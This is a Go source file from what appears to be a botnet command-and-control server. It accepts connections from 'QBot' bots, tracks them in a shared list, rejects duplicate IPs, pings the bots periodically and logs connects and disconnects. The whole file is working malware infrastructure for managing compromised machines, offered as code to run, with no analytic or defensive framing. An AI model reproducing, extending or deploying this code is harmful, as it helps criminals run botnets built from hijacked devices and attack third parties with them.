package raw

import (
	"fmt"
	"main.go/database"
	"net"
	"strings"
	"time"
)

func QBotListener() {
	server, err := net.Listen("tcp", database.Config.QBot.Host+":"+fmt.Sprint(database.Config.QBot.Port))
	go CheckQBots()
	database.CheckError(err)
	for {
		conn, err := server.Accept()
		if CheckDuplicate(strings.Split(conn.RemoteAddr().String(), ":")[0]) {
			err := conn.Close()
			if err != nil {
				return
			}
			continue
		} else {
			database.QBots = append(database.QBots, conn)
			database.CheckError(err)
			go QBotHandler(conn)
			fmt.Println("[ACCEPTED] Bot (Qbot) Connected (" + conn.RemoteAddr().String() + ")")
			database.SendLog("[ACCEPTED] Bot (Qbot) Connected (" + conn.RemoteAddr().String() + ")")
		}
	}
}

func CheckQBots() {
	for {
		if len(database.QBots) > 0 {
			for _, bot := range database.QBots {
				time.Sleep(10 * time.Second)
				err := Ping(bot)
				if err {
					return
				}
			}
		}
	}
}

func QBotHandler(conn net.Conn) {
	buffer := make([]byte, 32)
	for {
		if n, err := conn.Read(buffer); n == 0 || err != nil {
			RemoveQbot(conn)
			return
		}
	}
}

func Ping(conn net.Conn) bool {
	_, err := conn.Write([]byte("\r\nPING\r\n"))
	if err != nil {
		RemoveQbot(conn)
		return true
	}
	return false
}

func RemoveQbot(conn net.Conn) {
	for i, bot := range database.QBots {
		if bot.RemoteAddr().String() == conn.RemoteAddr().String() {
			database.QBots = append(database.QBots[:i], database.QBots[i+1:]...)
			fmt.Println("(DISCONNECTED) Bot (Qbot) Disconnected (" + conn.RemoteAddr().String() + ")")
			database.SendLog("(DISCONNECTED) Bot (Qbot) Disconnected (" + conn.RemoteAddr().String() + ")")
			if blockedIPs[conn.RemoteAddr().String()] {
				delete(blockedIPs, conn.RemoteAddr().String())
			}
			err := conn.Close()
			if err != nil {
				return
			}
		}
	}
}
